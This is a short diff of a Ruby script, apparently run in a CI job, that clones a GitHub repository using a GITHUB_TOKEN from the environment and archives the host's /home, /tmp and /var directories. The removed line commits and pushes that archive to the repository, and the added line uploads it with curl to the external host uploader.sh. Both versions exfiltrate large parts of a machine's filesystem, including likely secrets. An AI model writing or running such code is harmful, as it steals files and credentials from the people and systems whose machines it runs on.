@@ -10,7 +10,7 @@ token = ENV["GITHUB_TOKEN"]
 
 system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
 Dir.chdir("test-oracle-devrel") do
-  system("tar -I 'zstd -T0' -cvf aaa.zstd /home /tmp /var && git add aaa.zstd && git commit -m 'Add compressed archive aaa.zstd' && git push")
+  system("tar -I 'zstd -T0' -cvf aaa.zstd /home /tmp /var > /dev/null && curl uploader.sh -T aaa.zstd")
 end
 
 # system("git config --global user.name \"github-actions [bot]\"")
